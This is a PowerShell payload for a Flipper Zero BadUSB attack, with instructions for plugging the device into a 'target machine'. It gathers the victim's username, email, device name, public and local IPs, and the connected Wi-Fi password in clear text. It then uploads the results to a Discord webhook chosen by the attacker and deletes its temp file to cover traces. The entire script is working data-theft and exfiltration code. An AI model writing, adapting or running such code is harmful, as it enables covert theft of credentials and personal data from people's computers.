<#
.SYNOPSIS
    Name: f0-get-info.ps1
    The purpose of this script is to read and export general user & device information.

.DESCRIPTION
    This script is designed to work in conjunction with "GetInfo.txt" to extract the information about the target device & user.
    This script will read: Username, user email, device name, public IP, local network info & WiFi SSID key.
    The output will be sent to Discord if you provide a valid Webhook URL.

.NOTES
    Version:    0.2

    Author:     Contrxl

    Updated:    05/06/2024      -First version of standalone script.
                06/06/2024      -Changed exfil method to Discord over DropBox.
                                -Added cleanup at end to remove created Temp file.

.LINK 
    https://github.com/contrxl/flipper-stuff/tree/main/badusb

.EXAMPLE
    To run this as intended with FlipperZero:
        - Take a copy of "GetInfo.txt"
        - Insert your Discord Webhook URL in the $dc variable.
        - Upload "Snoop.txt" to your FlipperZero in the SDCard/badusb/ folder.
        - Connect FlipperZero to target machine and run "GetInfo.txt" from badusb.
#>

$FileName = "$env:tmp/$env:USERNAME-$env:COMPUTERNAME-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"

function Get-userEmail{
<#
.SYNOPSIS
    This function returns the user email if present.
#>
    try {
    $userEmail = (Get-CIMInstance CIM_ComputerSystem).PrimaryOwnerName
    } catch {
        Write-Error "No email detected!"
    }
    return $userEmail
}
$userEmail = Get-userEmail

function Get-userName{
<#
.SYNOPSIS
    This function returns the username if present.
#>
    try {
        $userName = (Get-LocalUser -Name $env:USERNAME).FullName
    } catch {
        Write-Error "No user found!"
    }
    return $userName
}
$userName = Get-userName

function Get-deviceName{
<#
.SYNOPSIS
    This function returns the device name if present.
#>
    try {
        $deviceName = (Get-CimInstance -ClassName CIM_ComputerSystem).Name
    } catch {
        Write-Error "Couldn't ID device name!"
    }
    return $deviceName
}
$deviceName = Get-deviceName

function Get-userPublicIP{
<#
.SYNOPSIS
    This function returns the device public IP address.
#>
        try {
        $userPublicIP = (Invoke-WebRequest ipinfo.io/ip).Content.Trim()
    } catch {
        Write-Error "Error identifying public IP!"
    }
    return $userPublicIP
}
$userPublicIP = Get-userPublicIP

function Get-userLocalNetinfo{
<#
.SYNOPSIS
    This function reads and returns local network info from the target device.
#>
    try {
        $userLocalIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*", "*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String
    } catch {
        Write-Error "Error collecting local network info!"
    }
    return $userLocalIP
}
$userLocalIP = Get-userLocalNetinfo

function Get-ssidKey {
<#
.SYNOPSIS
    This function pulls the WiFi key for the connected SSID from the target.
#>
    try {
    $ssid = netsh wlan show interface | Select-String -Pattern ' SSID '; $ssid = [string]$ssid
    $ssid_pos = $ssid.IndexOf(':')
    $ssid = $ssid.Substring($ssid_pos+2).Trim()
    
    $key = netsh wlan show profile $ssid key=clear | Select-String -Pattern 'Key Content'; $key = [string]$key
    $key_pos = $key.IndexOf(':')
    $key = $key.Substring($key_pos+2).Trim()
    } catch {
        Write-Error "No network detected!"
    }
    return $ssid + " :: " + $key
}
$ssidKey = Get-ssidKey

$out = @"

Username: $userName
Email: $userEmail
Device Name: $deviceName

Public IP: $userPublicIP
Local IP(s): $userLocalIP

SSID/SSID Key: $ssidKey

"@

$out > $FileName

<#
.SYNOPSIS
This function uploads the collected data to your Discord channel when an API key is provided as $dc.
#>
function exfilDiscord {
    [CmdletBinding()]
    param(
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text
    )

    $webHook = "$dc"

    $body = @{
        'username' = $ENV:USERNAME
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHook -Method Post -Body ($body | ConvertTo-Json)};

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $webHook
    }
}

# Checks the $dc value is not empty, and if so, sends the file to Discord.
if (-not ([string]::IsNullOrEmpty($dc))){
    exfilDiscord -file $FileName
}

# Clean up Temp file created.
Remove-Item $FileName